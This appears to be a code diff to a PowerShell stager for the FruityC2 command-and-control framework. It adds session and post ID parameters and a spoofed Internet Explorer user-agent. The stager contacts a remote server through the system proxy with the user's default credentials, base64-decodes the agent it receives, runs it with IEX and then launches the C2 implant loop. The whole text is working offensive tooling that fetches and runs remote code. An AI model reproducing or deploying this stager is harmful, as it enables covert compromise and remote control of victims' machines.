@@ -3,7 +3,8 @@ function Invoke-Stager {
         $r_server = "",
         $r_port = "",
         $r_ssl = "",
-        $UA = ""
+        $UA = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+        $SID = "SESSIONID"
     )
 
     [bool]$option_base64 = $false
@@ -50,7 +51,7 @@ function Invoke-Stager {
             $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
             $wc.Headers.Add("User-Agent",$UA)
-            $wc.Headers.Add("Cookie", "SESSIONID=$TARGET;")
+            $wc.Headers.Add("Cookie", "$SID=$TARGET;")
 
             $request = "http$($r_ssl)://$($r_server):$($r_port)$($path)"
 
@@ -121,13 +122,15 @@ function Invoke-Stager {
         $UA = $temp[2]
         $path_get = $temp[3]
         $path_post = $temp[4]
-    
-        $agent = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($temp[5]))
+        $post_id = $temp[5]
+        $session_id = $temp[6]
+
+        $agent = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($temp[7]))
         
         Write-Host $agent
 
         IEX $($agent)
-        Invoke-FruityC2 -path_get $path_get -path_post $path_post -jitter $jitter -stime $stime -UA $UA -stager $false -r_server $r_server -r_port $r_port -target $TARGET
+        Invoke-FruityC2 -path_get $path_get -path_post $path_post -jitter $jitter -stime $stime -UA $UA -stager $false -r_server $r_server -target $TARGET -post_id $post_id -session_id $session_id
 
     }
 
@@ -142,6 +145,6 @@ function Invoke-Stager {
 
     stager($TARGET)
 
-}
+} 
 clear
 Invoke-Stager -r_server "**domain**" -r_port "**port**" -UA "**useragent**"
